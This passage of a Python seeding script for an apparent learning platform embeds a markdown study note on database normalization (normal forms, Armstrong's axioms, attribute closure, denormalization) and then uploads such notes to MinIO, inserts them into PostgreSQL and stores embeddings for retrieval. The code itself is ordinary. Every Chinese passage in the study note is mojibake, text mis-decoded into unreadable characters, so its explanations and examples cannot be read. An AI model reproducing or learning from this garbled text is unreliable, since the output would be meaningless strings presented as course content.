杩濆弽: hobbies: "娓告吵,缂栫▼,闊充箰"  (鍒楄〃瀛樺偍)
淇: 鎷嗗垎涓篽obby琛ㄦ垨JSONB鍒?PostgreSQL)
```

### 2NF (绗簩鑼冨紡)
**瑕佹眰**: 婊¤冻1NF, 涓旀墍鏈夐潪涓诲睘鎬у畬鍏ㄥ嚱鏁颁緷璧栦簬鍊欓€夐敭
```
杩濆弽: R(瀛﹀彿, 璇剧▼鍙? 瀛︾敓濮撳悕, 鎴愮哗)
  FD: 瀛﹀彿鈫掑鐢熷鍚? (瀛﹀彿,璇剧▼鍙?鈫掓垚缁?  闂: 瀛︾敓濮撳悕鍙儴鍒嗕緷璧栦簬涓婚敭(瀛﹀彿,璇剧▼鍙?涓殑瀛﹀彿
淇: 鎷嗗垎涓? 瀛︾敓(瀛﹀彿, 濮撳悕), 鎴愮哗(瀛﹀彿, 璇剧▼鍙? 鎴愮哗)
```

### 3NF (绗笁鑼冨紡)
**瑕佹眰**: 婊¤冻2NF, 涓旀棤浼犻€掑嚱鏁颁緷璧?```
杩濆弽: R(瀛﹀彿, 绯诲彿, 绯讳富浠?
  FD: 瀛﹀彿鈫掔郴鍙? 绯诲彿鈫掔郴涓讳换
  闂: 绯讳富浠讳紶閫掍緷璧栦簬瀛﹀彿
淇: 鎷嗗垎涓? 瀛︾敓(瀛﹀彿, 绯诲彿), 绯?绯诲彿, 绯讳富浠?
```

### BCNF (Boyce-Codd鑼冨紡)
**瑕佹眰**: 浠绘剰闈炲钩鍑D X鈫扽, X蹇呭惈瓒呴敭
```
杩濆弽: R(瀛︾敓, 璇剧▼, 鏁欏笀)
  FD: 鏁欏笀鈫掕绋?(涓€浣嶆暀甯堝彧鏁欎竴闂ㄨ)
  鍊欓€夐敭: (瀛︾敓,璇剧▼) 鍜?(瀛︾敓,鏁欏笀)
  闂: 鏁欏笀鈫掕绋嬩腑, 鏁欏笀涓嶆槸瓒呴敭浣嗚绋嬩笉鍖呭惈鏁欏笀
淇: 鎷嗗垎涓? 鏁欏(鏁欏笀, 璇剧▼), 閫夎(瀛︾敓, 鏁欏笀)
```

### 4NF (绗洓鑼冨紡)
**閫傜敤鍦烘櫙**: 澶氬€间緷璧?MVD)闂
```
R(璇剧▼, 鏁欐潗, 鍙傝€冧功)
  MVD: 璇剧▼鈫掆啋鏁欐潗, 璇剧▼鈫掆啋鍙傝€冧功 (鏁欐潗涓庡弬鑰冧功鐙珛)
淇: 鎷嗗垎涓? 璇剧▼-鏁欐潗(璇剧▼, 鏁欐潗), 璇剧▼-鍙傝€冧功(璇剧▼, 鍙傝€冧功)
```

## 3. 鍑芥暟渚濊禆 Armstrong 鍏悊绯荤粺

```
鑷弽寰? Y鈯哫 鈫?X鈫扽
澧炲箍寰? X鈫扽 鈫?XZ鈫扽Z
浼犻€掑緥: X鈫扽, Y鈫抁 鈫?X鈫抁

鎺ㄨ:
  鍚堝苟寰? X鈫扽, X鈫抁 鈫?X鈫扽Z
  鍒嗚В寰? X鈫扽Z 鈫?X鈫扽, X鈫抁
  浼紶閫? X鈫扽, WY鈫抁 鈫?WX鈫抁
```

## 4. 灞炴€ч泦鐨勯棴鍖呯畻娉?
```python
def closure(X, FD_set):
    # 璁＄畻灞炴€ч泦X鍦ㄥ嚱鏁颁緷璧栭泦FD_set涓嬬殑闂寘
    result = set(X)
    changed = True
    while changed:
        changed = False
        for left, right in FD_set:
            if left.issubset(result) and not right.issubset(result):
                result.update(right)
                changed = True
    return result
```

## 5. 鏈€灏忚鐩?(瑙勮寖瑕嗙洊)

鏋勯€犳楠わ細
1. 灏嗘瘡涓狥D鐨勫彸閮ㄥ垎瑙ｄ负鍗曞睘鎬?(鍒嗚В寰?
2. 浠庢瘡涓狥D宸﹁竟鍘绘帀鍐椾綑灞炴€?(閫愪釜灞炴€ф鏌ユ槸鍚﹀繀瑕?
3. 鍒犻櫎鍐椾綑鐨凢D (妫€鏌ュ幓鎺夊悗闂寘鏄惁涓嶅彉)

## 6. 鍙嶈寖寮忓寲绛栫暐

| 绛栫暐 | 鎻忚堪 | 閫傜敤鍦烘櫙 |
|------|------|----------|
| 鍐椾綑鍒?| 鍦ㄥ叧鑱旇〃涓瓨鍌ㄩ儴鍒嗗垪 | 閬垮厤JOIN |
| 棰勮绠楁眹鎬?| count/sum绛夎仛鍚堝€兼彁鍓嶅瓨鍌?| OLAP/鎶ヨ〃 |
| 蹇収琛?| 瀹氭湡淇濆瓨鏌愪釜鏃堕棿鐐圭殑鏁版嵁 | 鍘嗗彶鏌ヨ |
| 琛ㄥ垎鍓?| 鍨傜洿鍒嗗壊(鍒?鎴栨按骞冲垎鍓?琛? | 澶ц〃浼樺寲 |

**鍘熷垯**: 鍙嶈寖寮忓寲鏄富鍔ㄥ紩鍏ュ啑浣欎互鎹㈠彇鎬ц兘锛屽繀椤绘湁鏄庣‘鐨勬€ц兘鐡堕椹卞姩锛屽苟璁板綍鏁版嵁涓€鑷存€х淮鎶ょ瓥鐣ワ紙瑙﹀彂鍣?搴旂敤灞?瀹氭椂鏍℃锛夈€?
---
*鏉ユ簮: Codd E.F. "Further Normalization of the Data Base Relational Model", Database System Concepts (Siberschatz)*
"""})

print(f"Defined {len(RESOURCES)} additional resources")

# 鈹€鈹€ DB Helpers 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
def connect_db():
    return psycopg2.connect(**DB_CONFIG)


def connect_minio():
    return Minio(
        MINIO_CONFIG["endpoint"],
        access_key=MINIO_CONFIG["access_key"],
        secret_key=MINIO_CONFIG["secret_key"],
        secure=MINIO_CONFIG["secure"],
    )


def ensure_bucket(client: Minio, bucket: str):
    if not client.bucket_exists(bucket):
        client.make_bucket(bucket)


def upload_resource_file(client: Minio, bucket: str, resource: dict) -> tuple[str, int]:
    safe_name = resource["title"].replace("/", "-").replace(" ", "_")
    object_key = f"resources/{safe_name}.md"
    content_bytes = resource["content"].encode("utf-8")
    data = BytesIO(content_bytes)
    client.put_object(bucket, object_key, data, len(content_bytes), content_type="text/markdown")
    return object_key, len(content_bytes)


def generate_embeddings(texts: list[str], dimension: int = RUNTIME_CONFIG.embedding_dimension) -> list[list[float]]:
    input_data = [{"text": t} for t in texts]
    resp = MultiModalEmbedding.call(
        model=RUNTIME_CONFIG.embedding_model_name, input=input_data,
        dimension=dimension, output_type="dense",
    )
    if resp.status_code != 200:
        raise RuntimeError(f"API error: {resp.code} {resp.message}")
    emb_list = resp.output.get("embeddings", [])
    emb_list.sort(key=lambda x: x.get("index", 0))
    return [e["embedding"] for e in emb_list]


def build_embedding_str(vec: list[float]) -> str:
    return "[" + ",".join(str(v) for v in vec) + "]"


def main():
    dry_run = "--dry-run" in sys.argv
    print("=" * 60)
    print(f"Batch 2: {len(RESOURCES)} Additional Resources 鈫?MinIO + PostgreSQL")
    print("=" * 60)

    if dry_run:
        print("\n[DRY RUN]")
        vids = sum(1 for r in RESOURCES if r["type"] == "VIDEO")
        reads = sum(1 for r in RESOURCES if r["type"] != "VIDEO")
        print(f"  VIDEO: {vids}, READING/MINDMAP: {reads}")
        for r in RESOURCES:
            print(f"  [{r['type']:8s}] {r['title']}")
        return

    minio = connect_minio()
    ensure_bucket(minio, BUCKET)
    conn = connect_db()

    try:
        with conn:
            with conn.cursor() as cur:
                # Step 1: Upload to MinIO
                object_ids: dict[str, str] = {}
                for i, r in enumerate(RESOURCES):
                    object_key, size_bytes = upload_resource_file(minio, BUCKET, r)
                    obj_id = str(uuid.uuid4())
                    cur.execute("""
                        INSERT INTO storage.resource_object (id, provider, bucket_name, object_key,
                            file_name, mime_type, size_bytes, access_mode, storage_url)
                        VALUES (%s, 'RUSTFS', %s, %s, %s, 'text/markdown', %s, 'PRESIGNED', %s)
                    """, (obj_id, BUCKET, object_key,
                          f"{r['title'].replace('/', '-')}.md",
                          size_bytes,
                          f"minio://{BUCKET}/{object_key}"))
                    object_ids[r["title"]] = obj_id
                    if (i + 1) % 8 == 0:
                        print(f"  MinIO upload [{i + 1}/{len(RESOURCES)}]")

                print(f"  Uploaded {len(RESOURCES)} objects to MinIO")

                # Step 2: app.learning_resource
                resource_ids: dict[str, str] = {}
                for r in RESOURCES:
                    lr_id = str(uuid.uuid4())
                    cur.execute("""
                        INSERT INTO app.learning_resource (id, title, domain, resource_type,
                            difficulty_level, source_kind, access_scope, summary_text, tags,
                            metadata_json, storage_object_id, status)
                        VALUES (%s, %s, 'COMPUTER_SCIENCE', %s::app.resource_type,
                            %s::app.difficulty_level, 'IMPORTED'::app.source_kind,
                            'GLOBAL'::app.access_scope, %s, %s, %s, %s, 'ACTIVE')
                    """, (
                        lr_id, r["title"], r["type"], r["difficulty"],
                        r["description"],
                        json.dumps(r["tags"], ensure_ascii=False),
                        json.dumps({"course": r["course"], "chapter": r["chapter"],
                                    "source_url": r["source_url"]}, ensure_ascii=False),
                        object_ids.get(r["title"]),
                    ))
                    resource_ids[r["title"]] = lr_id
                print(f"  Created {len(RESOURCES)} learning_resource entries")

                # Step 3: rag.resource_document
                resource_doc_ids: dict[str, str] = {}
                for r in RESOURCES:
                    rd_id = str(uuid.uuid4())
                    cur.execute("""
                        INSERT INTO rag.resource_document (id, resource_id, title, domain,
                            resource_type, difficulty_level, source_kind, source_ref,
                            summary_text, access_scope, metadata_json)
                        VALUES (%s, %s, %s, 'COMPUTER_SCIENCE',
                            %s::app.resource_type, %s::app.difficulty_level,
                            'IMPORTED'::app.source_kind, %s, %s,
                            'GLOBAL'::app.access_scope, %s)
                    """, (
                        rd_id, resource_ids[r["title"]], r["title"],
                        r["type"], r["difficulty"],
                        r["source_url"], r["description"],
                        json.dumps({"course": r["course"], "chapter": r["chapter"],
                                    "object_key": f"resources/{r['title'].replace('/', '-').replace(' ', '_')}.md"},
                                   ensure_ascii=False),
                    ))
                    resource_doc_ids[r["title"]] = rd_id
                print(f"  Created {len(RESOURCES)} resource_document entries")

                # Step 4: Vectorize
                DIMENSION = 1024
                BATCH_SIZE = 5
                descriptions = [r["description"] for r in RESOURCES]
                failed = 0
                for batch_start in range(0, len(RESOURCES), BATCH_SIZE):
                    batch = RESOURCES[batch_start : batch_start + BATCH_SIZE]
                    batch_descs = descriptions[batch_start : batch_start + BATCH_SIZE]

                    try:
                        embeddings = generate_embeddings(batch_descs, DIMENSION)
                    except Exception as e:
                        print(f"  Batch [{batch_start + 1}] API error: {e}, retrying individually...")
                        embeddings = []
                        for desc in batch_descs:
                            try:
                                emb = generate_embeddings([desc], DIMENSION)
                                embeddings.extend(emb)
                            except Exception:
                                embeddings.append(None)
                                failed += 1
                            time.sleep(0.5)

                    for j, r in enumerate(batch):
                        emb_vec = embeddings[j] if j < len(embeddings) and embeddings[j] is not None else None
                        if emb_vec is None:
                            print(f"  SKIP (no embedding): {r['title']}")
                            continue

                        token_estimate = int(len(r["description"]) / 1.5)
                        cur.execute("""
                            INSERT INTO rag.resource_chunk (document_id, resource_id, chunk_no,
                                content, embedding, token_count, domain, resource_type,
                                difficulty_level, access_scope, quality_score, metadata_json)
                            VALUES (%s, %s, 1, %s, %s, %s, 'COMPUTER_SCIENCE',
                                %s::app.resource_type, %s::app.difficulty_level,
                                'GLOBAL'::app.access_scope, 0.90, %s)
                        """, (
                            resource_doc_ids[r["title"]],
                            resource_ids[r["title"]],
                            r["description"],
                            build_embedding_str(emb_vec),
                            token_estimate,
                            r["type"],
                            r["difficulty"],
                            json.dumps({"course": r["course"], "chapter": r["chapter"]},
                                       ensure_ascii=False),
                        ))
                    print(f"  Vectorized [{min(batch_start + BATCH_SIZE, len(RESOURCES))}/{len(RESOURCES)}]")
                    time.sleep(0.3)

        if failed > 0:
            print(f"\nWarning: {failed} embeddings failed")
        print(f"\nDone. {len(RESOURCES)} additional resources imported.")
    finally:
        conn.close()


if __name__ == "__main__":
    main()

